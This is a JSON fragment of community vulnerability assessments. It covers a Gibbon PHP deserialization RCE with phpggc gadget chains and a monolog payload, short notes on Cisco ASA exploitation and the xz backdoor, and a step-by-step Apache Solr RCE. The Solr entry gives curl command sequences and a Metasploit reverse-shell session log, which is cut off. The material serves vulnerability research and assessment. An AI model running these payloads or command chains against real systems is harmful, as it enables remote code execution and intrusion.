<= v4.3.7    RCE (Function call)    __destruct\r\nSymfony/RCE8                              v3.4.0 <= v4.4.18 v5.0.0 <= v5.2.1                      RCE (Function call)    __destruct\r\nTCPDF/FD1                                 <= 6.3.5                                                File delete            __destruct     *\r\nThinkPHP/FW1                              5.0.4-5.0.24                                            File write             __destruct     *\r\nThinkPHP/FW2                              5.0.0-5.0.03                                            File write             __destruct     *\r\nThinkPHP/RCE1                             5.1.x-5.2.x                                             RCE (Function call)    __destruct     *\r\nThinkPHP/RCE2                             5.0.24                                                  RCE (Function call)    __destruct     *\r\nThinkPHP/RCE3                             -6.0.1+                                                 RCE (Function call)    __destruct\r\nThinkPHP/RCE4                             -6.0.1+                                                 RCE (Function call)    __destruct\r\nTypo3/FD1                                 4.5.35 <= 10.4.1                                        File delete            __destruct     *\r\nvBulletin/RCE1                            -5.6.9+                                                 RCE (Function call)    __destruct\r\nWordPress/Dompdf/RCE1                     0.8.5+ & WP < 5.5.2                                     RCE (Function call)    __destruct     *\r\nWordPress/Dompdf/RCE2                     0.7.0 <= 0.8.4 & WP < 5.5.2                             RCE (Function call)    __destruct     *\r\nWordPress/Guzzle/RCE1                     4.0.0 <= 6.4.1+ & WP < 5.5.2                            RCE (Function call)    __toString     *\r\nWordPress/Guzzle/RCE2                     4.0.0 <= 6.4.1+ & WP < 5.5.2                            RCE (Function call)    __destruct     *\r\nWordPress/P/EmailSubscribers/RCE1         4.0 <= 4.4.7+ & WP < 5.5.2                              RCE (Function call)    __destruct     *\r\nWordPress/P/EverestForms/RCE1             1.0 <= 1.6.7+ & WP < 5.5.2                              RCE (Function call)    __destruct     *\r\nWordPress/P/WooCommerce/RCE1              3.4.0 <= 4.1.0+ & WP < 5.5.2                            RCE (Function call)    __destruct     *\r\nWordPress/P/WooCommerce/RCE2              <= 3.4.0 & WP < 5.5.2                                   RCE (Function call)    __destruct     *\r\nWordPress/P/YetAnotherStarsRating/RCE1    ? <= 1.8.6 & WP < 5.5.2                                 RCE (Function call)    __destruct     *\r\nWordPress/PHPExcel/RCE1                   1.8.2+ & WP < 5.5.2                                     RCE (Function call)    __toString     *\r\nWordPress/PHPExcel/RCE2                   <= 1.8.1 & WP < 5.5.2                                   RCE (Function call)    __toString     *\r\nWordPress/PHPExcel/RCE3                   1.8.2+ & WP < 5.5.2                                     RCE (Function call)    __destruct     *\r\nWordPress/PHPExcel/RCE4                   <= 1.8.1 & WP < 5.5.2                                   RCE (Function call)    __destruct     *\r\nWordPress/PHPExcel/RCE5                   1.8.2+ & WP < 5.5.2                                     RCE (Function call)    __destruct     *\r\nWordPress/PHPExcel/RCE6                   <= 1.8.1 & WP < 5.5.2                                   RCE (Function call)    __destruct     *\r\nYii/RCE1                                  1.1.20                                                  RCE (Function call)    __wakeup       *\r\nYii/RCE2                                  1.1.20                                                  RCE (Function call)    __destruct\r\nYii2/RCE1                                 <2.0.38                                                 RCE (Function call)    __destruct     *\r\nYii2/RCE2                                 <2.0.38                                                 RCE (PHP code)         __destruct     *\r\nZendFramework/FD1                         ? <= 1.12.20                                            File delete            __destruct\r\nZendFramework/RCE1                        ? <= 1.12.20                                            RCE (PHP code)         __destruct     *\r\nZendFramework/RCE2                        1.11.12 <= 1.12.20                                      RCE (Function call)    __toString     *\r\nZendFramework/RCE3                        2.0.1 <= ?                                              RCE (Function call)    __destruct\r\nZendFramework/RCE4                        ? <= 1.12.20                                            RCE (PHP code)         __destruct     *\r\nZendFramework/RCE5                        2.0.0rc2 <= 2.5.3                                       RCE (Function call)    __destruct\r\n```\r\nYeah, this definitely helps, but we need to figure out first which gadget chains are supported by our Gibbon web application.\r\nIf we look at the directory where Gibbon is installed, typically `/var/www` or `/var/www/html` depending on the `webroot` setting, you will find a directory `vendor`. Running the `ls` command will list the framework/libraries that are installed and supported by the web application.\r\n```\r\nroot@cuckoo:/var/www/vendor# ls\r\naura          ezyang      league        moneyphp  omnipay    phpoffice  setasign\r\nautoload.php  firebase    maennchen     monolog   paragonie  phpseclib  slim\r\nclue          fzaninotto  markbaker     mpdf      parsecsv   psr        symfony\r\ncomposer      google      matthewbdaly  myclabs   php-http   ralouphie  tecnickcom\r\neluceo        guzzlehttp  microsoft     nikic     phpmailer  robthree   twig\r\n```\r\nAnd indeed you can see that there are frameworks/libraries listed that are part of our gadget chain list, such as `monolog` and `symfony`.\r\n\r\nOk, so we have some pre-built gadget chains options that we can try, but we also need to figure if the versions installed are supported.\r\nLet's explore `monolog` a bit deeper and check `CHANGELOG.md` which version is installed.\r\n```shell\r\nroot@cuckoo:/var/www/vendor/monolog/monolog# cat CHANGELOG.md\r\n### 1.27.1 (2022-06-09)\r\n\r\n  * Fixed MandrillHandler support for SwiftMailer 6 (#1676)\r\n  * Fixed StreamHandler chunk size (backport from #1552)\r\n\r\n### 1.27.0 (2022-03-13)\r\n\r\n  * Added $maxDepth / setMaxDepth to NormalizerFormatter / JsonFormatter to configure the maximum depth if the default of 9 does not work for you (#1633)\r\n```\r\nVersion `1.27.1` is installed, so the next question is which pre-built monolog gadget chains can we use?\r\nThere is a nice python script  `test-gc-compatibility.py` as part of  `phpggc` that does this job for us.\r\n```shell\r\nkali@cerberus:~/phpggc$ python ./test-gc-compatibility.py monolog/monolog:1.27.1 monolog/fw1 monolog/rce1 monolog/rce2 monolog/rce3 monolog/rce4 monolog/rce5 monolog/rce6 monolog/rce7 monolog/rce8 monolog/rce9 -w 4\r\nRunning on PHP version PHP 8.2.12 (cli) (built: Jan  8 2024 02:15:58) (NTS).\r\nTesting 1 versions for monolog/monolog against 10 gadget chains.\r\n\r\n\u250f\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2533\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2513\r\n\u2503 monolog/monolog \u2503 Package \u2503 monolog/fw1 \u2503 monolog/rce1 \u2503 monolog/rce2 \u2503 monolog/rce3 \u2503 monolog/rce4 \u2503 monolog/rce5 \u2503 monolog/rce6 \u2503 monolog/rce7 \u2503 monolog/rce8 \u2503 monolog/rce9 \u2503\r\n\u2521\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2547\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2547\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2547\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2547\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2547\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2547\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2547\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2547\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2547\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2547\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2547\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2529\r\n\u2502 1.27.1          \u2502   OK    \u2502     KO      \u2502      OK      \u2502      OK      \u2502      KO      \u2502      KO      \u2502      OK      \u2502      OK      \u2502      OK      \u2502      KO      \u2502      KO      \u2502\r\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\r\nkali@cerberus:~/phpggc$\r\n```\r\nSo we have quite some options that we can test.\r\n\r\nTo generate the serialized data with the payload for a particular gadget chain, you can run the following command: `./phpggc -f monolog/rce1 system id` which generates the gadget chain `monolog/rce1` with the payload. In this case, the serialized data gets deserialized and the `id` command gets executed using the system function call.\r\nIt is important, that it does not really matter if the instantiation of this object makes logical sense from an application perspective. We are manipulating the serialized data generated by the web application and pushing it to a supported gadget chain that will generate an object instance and hopefully execute the payload during the deserialization process. The `-f` option applies the fast-destruct technique, so that the object is destroyed right after the `unserialize()` call, as opposed to at the end of the script.\r\n```shell\r\nkali@cerberus:~/phpggc$ ./phpggc -f monolog/rce1 system id\r\na:2:{i:7;O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"*socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"*handler\";r:3;s:13:\"*bufferSize\";i:-1;s:9:\"*buffer\";a:1:{i:0;a:2:{i:0;s:2:\"id\";s:5:\"level\";N;}}s:8:\"*level\";N;s:14:\"*initialized\";b:1;s:14:\"*bufferLimit\";i:-1;s:13:\"*processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}i:7;i:7;}\r\n```\r\nImportant: there are null bytes in the serialized data, for example `*socket` is `\\x00*\\x00socket` and therefore the size is 9 and not 7. \r\nThis applies for all the `*items`.\r\n\r\nI have created an exploit that is are published as official module [Gibbon Online School Platform Authenticated RCE [CVE-2024-24725]](https://github.com/rapid7/metasploit-framework/pull/19044) in Metasploit. \r\nIf you review the module, you will see most of the above theory and discussions back in the exploit code.\r\n\r\n### Summary\r\nDeserialization flaws are pretty common in web application design. \r\nHere are some simple  steps to identify and exploit potential deserialization vulnerabilities in the application code:\r\n1. get access to the application source code;\r\n2. search for the language specific serialization and deserialization functions in the code. For PHP, these functions  are `serialize()` and `unserialize()`;\r\n3. check if user-controlled parameters are part of serialize and deserialize process;\r\n4. check the availability of pre-built gadget chains that are supported by your web application and can be leveraged; and\r\n5. last but not least, try and error until the magic happens ;-)\r\n\r\nTill next time....\r\n\r\n## References\r\n[CVE-2024-24725](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-24725)\r\n[MITRE CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)\r\n[OWASP CWE-502: Deserialization of Untrusted Data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)\r\n[Metasploit PR 19044: Gibbon Online School Platform Authenticated RCE [CVE-2024-24725]] (https://github.com/rapid7/metasploit-framework/pull/19044)\r\n\r\n### Credits\r\nCredits go to the security researchers below whom discovered this vulnerability\r\n* `SecondX.io Research Team (Ali Maharramli, Fikrat Guliev, Islam Rzayev )`",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "d8b380b1-597a-4352-8807-975512f6cd89",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "f1d5dd98-13bc-48ae-b2cc-bd7c4e4a6f21",
      "created": "2024-04-01T18:50:01.102904Z",
      "revisionDate": "2024-04-01T18:50:01.102339Z",
      "document": "Rapid7 observed pre-patch exploitation of this vulnerability from March through at least August of 2023. Several of the incidents our MDR team investigated ended in ransomware deployment. In September 2023, Cisco assigned CVE-2023-20269, which covers some of the attacker behavior Rapid7 incident responders observed: https://www.rapid7.com/blog/post/2023/08/29/under-siege-rapid7-observed-exploitation-of-cisco-asa-ssl-vpns/\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        }
      ]
    },
    {
      "id": "05a530d9-2cbb-4405-baec-c6ed4a9472a8",
      "editorId": "4a5ca587-a819-49f8-91eb-07b9c2a708fe",
      "topicId": "a47fc1db-0efc-4a72-8806-9ae74c668e23",
      "created": "2024-04-02T18:05:11.533393Z",
      "revisionDate": "2024-04-03T08:31:36.633858Z",
      "document": "The backdoor is present in versions `5.6.0` and `5.6.1`.\r\n\r\nThis one has gained significant attention over the past few days. To date, there is has been observation that this backdoor was ever leveraged, and it will be unlikely to do so now, given the attention that it has received. \r\n\r\nFrom a Technical perspective, this one was difficult to detect and prevent since the payload was loaded and executed in memory (as part of the SSHD process). The backdoor allowed remote code to be executed via the SSH process, making it even harder to detect. \r\n\r\nThis backdoor was only discovered by chance, by a Microsoft developer at Microsoft, Andres Freund. Andres was investigating a performance issue in SSH (which was caused by the backdoor), and then stumbled upon the backdoor. Details of which can be found on their post: https://www.openwall.com/lists/oss-security/2024/03/29/4. Also worth noting that the backdoor was not introduced into the code of xz, but rather the binaries. This means if you built the binaries from source, you did not include the backdoor.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "12d28505-ef0b-42d3-ab4b-4854d443b6dc",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "a47fc1db-0efc-4a72-8806-9ae74c668e23",
      "created": "2024-04-03T08:52:12.36436Z",
      "revisionDate": "2024-04-03T09:05:33.099574Z",
      "document": "xz backdoor leads to authentication bypass on OpenSSH. So this remote account takeover on vulnerable systems.\r\n\r\nMany linux distributions were not impacted because of various reasons:\r\n\r\n- they were packing older version of xz where the backdoor was not introduced yet (e.g. Debian stable)\r\n- they were building from source\r\n- they didn't patched OpenSSH to use liblzma (e.g. ArchLinux: [news](https://archlinux.org/news/the-xz-package-has-been-backdoored/), [advisory](https://security.archlinux.org/AVG-2851))\r\n- they don't even use xz (e.g. Amazon Linux)\r\n\r\nUnaffected distribution examples:\r\n\r\n![](https://pbs.twimg.com/media/GJ6p6wOWUAA_6Uu?format=jpg&name=medium)\r\n\r\nAffected distribution examples (which are mostly unstable version of major distros + Kali):\r\n\r\n![](https://pbs.twimg.com/media/GJ6pN1TXEAAd1mj?format=jpg&name=medium)\r\n\r\nA Nessus plugin is available for detection (n\u00b0 192708):\r\n\r\n- https://www.tenable.com/plugins/nessus/192708\r\n- more plugins for xz backdoor: https://www.tenable.com/cve/CVE-2024-3094/plugins\r\n\r\n[@fr0gger_](https://twitter.com/fr0gger_/status/1774342248437813525) published an outbreak visual of the whole backdoor chain:\r\n\r\n![](https://pbs.twimg.com/media/GJ-6mD9aIAARaiY?format=jpg&name=4096x4096)\r\n\r\nTimeline summary:\r\n\r\n![](https://pbs.twimg.com/media/GKFx3qwbQAASJzv?format=png&name=4096x4096)\r\n\r\nAnalysis:\r\n\r\n- [smx - xz backdoor analysis and symbol mapping](https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504)\r\n- [gynvael - xz/liblzma: Bash-stage Obfuscation Explained](https://gynvael.coldwind.pl/?lang=en&id=782)\r\n- [FAQ](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27)\r\n- [boehs - timeline](https://boehs.org/node/everything-i-know-about-the-xz-backdoor)\r\n- [openwall](https://www.openwall.com/lists/oss-security/2024/03/29/4)\r\n- [Wiz -Backdoor in XZ Utils allows RCE: everything you need to know](https://www.wiz.io/blog/cve-2024-3094-critical-rce-vulnerability-found-in-xz-utils)\r\n- [binarly - XZ Utils Supply Chain Puzzle: Binarly Ships Free Scanner for CVE-2024-3094 Backdoor](https://www.binarly.io/blog/xz-utils-supply-chain-puzzle-binarly-ships-free-scanner-for-cve-2024-3094-backdoor)\r\n- [Microsoft - FAQ and guidance for XZ Utils backdoor](https://techcommunity.microsoft.com/t5/microsoft-defender-vulnerability/microsoft-faq-and-guidance-for-xz-utils-backdoor/ba-p/4101961)\r\n\r\nPotential nuclei templates (PR not merged yet):\r\n\r\n- https://github.com/projectdiscovery/nuclei-templates/pull/9458/files\r\n- https://github.com/projectdiscovery/nuclei-templates/pull/9464/files\r\n\r\nYARA rules:\r\n\r\n- [BCKDR_XZUtil_Binary_CVE_2024_3094_Mar24_1](https://valhalla.nextron-systems.com/info/rule/BCKDR_XZUtil_Binary_CVE_2024_3094_Mar24_1)\r\n- [BCKDR_XZUtil_KillSwitch_CVE_2024_3094_Mar24_1](https://valhalla.nextron-systems.com/info/rule/BCKDR_XZUtil_KillSwitch_CVE_2024_3094_Mar24_1)\r\n- [BCKDR_XZUtil_Script_CVE_2024_3094_Mar24_1](https://valhalla.nextron-systems.com/info/rule/BCKDR_XZUtil_Script_CVE_2024_3094_Mar24_1)\r\n- [Neo23x0 - bkdr_xz_util_cve_2024_3094.yar](https://github.com/ruppde/signature-base/blob/bf8b00df32c6f1d1af9cb41ce2a99be9cc7ecbe5/yara/bkdr_xz_util_cve_2024_3094.yar)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "c9511426-7250-4e5f-bd18-d42861f3ccae",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "a47fc1db-0efc-4a72-8806-9ae74c668e23",
      "created": "2024-04-03T19:28:12.726785Z",
      "revisionDate": "2024-04-03T19:28:12.726212Z",
      "document": "On the one hand, it's backdoored software, so \"exploitation\" could arguably have already occurred (in the form of an already executed supply chain attack). On the other hand, it's not immediately clear that anyone has used this backdoor to do specific Bad Things\u2122, so \"exploited in the wild\" doesn't sound quite right either. Developers probably most at risk here rather than production systems, but it would appear this got caught pretty quickly. \r\n\r\n**Bad:** \r\n* Backdoor!\r\n* In a popular command-line tool\r\n* Made it into unstable branches/bleeding-edge releases of some distros (Kali, Arch, etc) \r\n* \"Open source is unsafe\" commentary (c'mon,  y'all)\r\n* Salacious! Speculation runs rife! xz is drowning out Kate Middleton conspiracy theories in my timelines! \r\n\r\n**Good:**\r\n* Didn't make it into prod systems, stable branches unaffected\r\n* Not a simple attack \r\n* Not clear that anyone is actively using this backdoor for badness \u2014  private SSH key still hasn't shown up\r\n\r\n",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "2e43413d-7cc0-46aa-a975-0609302e8815",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "e7825d9f-3c7e-4a7c-a926-bce6ec7fabd7",
      "created": "2024-04-05T16:40:34.181826Z",
      "revisionDate": "2024-05-09T14:55:50.774245Z",
      "document": "\r\nApache Solr from 6.0.0 through 8.11.2, from 9.0.0 before 9.4.1 is affected by an Unrestricted Upload of File with Dangerous Type vulnerability which can result in remote code execution in the context of the user running Apache Solr.\r\n\r\nThis exploit abuses three components of the API.  It should be noted that by default Apache Solr ships with no authentication mechanism to protect these API endpoints from attackers. The Basic Authentication plugin can easily be added to Apache Solr which makes this exploit an authenticated RCE however by default this is an unauth RCE. \r\n\r\nThe three API functions that this exploit uses to achieve code execution are as follows:\r\n\r\n- /admin/configs?action=UPLOAD\r\n- /admin/collections?action=CREATE\r\n- /admin/collections?action=BACKUP\r\n\r\nThe configs UPLOAD function allows the user to upload a configuration specification in the form of the .zip file. The crux of the vulnerability lies in the fact that the zip file is not properly sanitized and an attacker is able to include a malicious .class file inside the zip. The class needs to be compiled with the following package name: `package  zk_backup_0.configs.conf1 ;` in order for it to be executed.\r\n\r\nA number of extra steps are required in order to get that .class file to execute. Upload a config like so:\r\n```\r\ncurl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @conf1.zip \"http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&name=conf1\"\r\n```\r\n\r\nNext the collections CREATE function can be used to create a 'collection' in Apache Solr. When Apache Solr creates a Collection, it will use a specific directory as the classpath and load some classes from it (this is important to note for later). Create a collection from the config uploaded previously like so:\r\n```\r\ncurl \"http://127.0.0.1:8983/solr/admin/collections?action=CREATE&name=collection1&numShards=1&replicationFactor=1&wt=json&collection.configName=conf1\"\r\n```\r\n\r\nNext the attacker can abuse the BACKUP function. The backup function of the Collection can export malicious class files uploaded by attackers to a specific directory, which is very useful. This allows the attacker to place the malicious .class file in a location which will then be loaded by a Collection next time we create one. The backup function accepts the parameters `locations` which is the path to be exported and `name` which is actually equivalent to part of the path. Getting the .class file into a place where it can be executed successfully is a two step process. First export the collection like so:\r\n```\r\ncurl \"http://127.0.0.1:8983/solr/admin/collections?action=BACKUP&collection=collection1&location=/var/solr/data/&name=collection2_shard1_replica_n1\"\r\n```\r\n\r\nThis will export `collection1` to `/var/solr/data/collection2_shard1_replica_n1`\r\nAnd it's corresponding configuration is exported to: `/var/solr/data/collection2_shard1_replica_n1/collection1/zk_backup_0/configs/`\r\n\r\nNow export it again with location set to `/var/solr/data/collection2_shard1_replica_n1` and name set to `lib`:\r\n```\r\ncurl \"http://127.0.0.1:8983/solr/admin/collections?action=BACKUP&collection=collection1&location=/var/solr/data/collection2_shard1_replica_n1&name=lib\"\r\n```\r\n\r\nNow our malicious class we uploaded in the original config ends up here:\r\n`/var/solr/data/collection2_shard1_replica_n1/lib/collection1/zk_backup_0/configs/conf1`\r\n\r\nYou may have noticed that the directory structure above corresponds exactly to the required package name mentioned earlier.\r\n\r\nNow the attacker uploads a second configuration. This time without a malicious `.class`  but with:\r\n```\r\n<valueSourceParser  name= \"myfunc\"  class= \"zk_backup_0.configs.conf1.Exp\"  />\r\n```\r\nSet inside `solrconfig.xml`.  This \"SourceParser\" will get loaded when a collection is created from this config.\r\nUpload the config like so:\r\n```\r\ncurl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @conf2.zip \"http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&name=conf2\"\r\n```\r\n\r\nAnd now for the the final step in the exploit, create a second collection from the second configuration just uploaded:\r\n```\r\ncurl \"http://127.0.0.1:8983/solr/admin/collections?action=CREATE&name=collection2&numShards=1&replicationFactor=1&wt=json&collection.configName=conf2\"\r\n```\r\n\r\nDuring the collection creation process our malicious class will be loaded. It's important to note the code one wants executed should be placed in the `static` method of the malicious class such that it will be executed when the class is loaded as the class isn't actually being called directly. \r\n\r\nAnd Voil\u00e0! If everything has gone to plan the code in the `static` method of the malicious class should execute in the context of the user running Apache Solr. \r\n\r\n# Attacker Value and Exploitability Explained\r\n### Attacker value 3/5 \r\nAlthough by default this vulnerability doesn't require authentication, Apache Solr used in a production environment likely have an authentication plugin installed with it and or would likely not be exposed to the internet. \r\n### Exploitability 4/5\r\nIf you can access the application, exploitation is trivial, with the exception of needing to know credentials if the auth plugin is present. \r\n\r\n# Try it yourself\r\nIf you wish to see this exploit in action, simply spin up a vulnerable Apache Solr instance with the following docker-compose file:\r\n```\r\nversion: '3'\r\n\r\nservices:\r\n  solr:\r\n    image: solr:9.0.0\r\n    ports:\r\n      - \"8983:8983\"\r\n      - \"5005:5005\"\r\n    command: sh -c \"solr start -c -a '-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005' && tail -f /dev/null\"\r\n```\r\nLoad the metasploit module for this exploit, set the `rhost` and `lhost` values, run it and you should get a session in the context of the user running Apache Solr:\r\n```\r\nmsf6 > use linux/http/apache_solr_backup_restore\r\n[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp\r\nmsf6 exploit(linux/http/apache_solr_backup_restore) > set rhosts 127.0.0.1\r\nrhosts => 127.0.0.1\r\nmsf6 exploit(linux/http/apache_solr_backup_restore) > set lhost 172.16.199.1\r\nlhost => 172.16.199.1\r\nmsf6 exploit(linux/http/apache_solr_backup_restore) > run\r\n[*] Started reverse TCP handler on 172.16.199.1:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[*] Running check method\r\n[*] 127.0.0.1:8983: Authentication not required\r\n[*] Found Apache Solr 9.0.0\r\n[*] OS version is Linux amd64 6.6.16-linuxkit\r\n[+] The target appears to be vulnerable. Found Apache Solr version: 9.0.0\r\n[+] Uploaded configuration successfully\r\n[+] Backed up collection successfully\r\n[+] Backed up collection successfully\r\n[+] Uploaded configuration successfully\r\n[*] Sending stage (3045380 bytes) to 172.16.199.1\r\n[+] Successfully dropped the payload\r\n[*] Meterpreter session 12 opened (172.16.199.1:4444 -> 172.16.199.1:50057) at 2024-04-01 16:18:17 